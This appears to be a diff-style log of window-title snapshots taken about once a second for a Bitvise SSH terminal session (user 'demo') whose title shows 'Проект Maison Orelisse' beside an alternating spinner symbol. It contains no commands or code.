+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:57  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:58  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:48:59  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:00  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:01  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:02  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:03  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:04  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:05  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:06  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:07  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:08  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:09  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:10  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:11  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:11  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:12  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:13  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:14  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:15  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:16  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:17  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:18  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:19  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:20  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:21  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:22  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:23  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:24  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:25  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:26  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:27  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:28  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:29  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:30  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:31  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:32  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠐ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:33  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ⠂ Проект Maison Orelisse
+----------------------------------------------------------------------------
+
+--- WINDOW  2026.07.27 11:49:33  [totermw.exe] demo@185.156.41.5:22 - Bitvise xterm-256color - ✳ Проект Maison Orelisse
+----------------------------------------------------------------------------
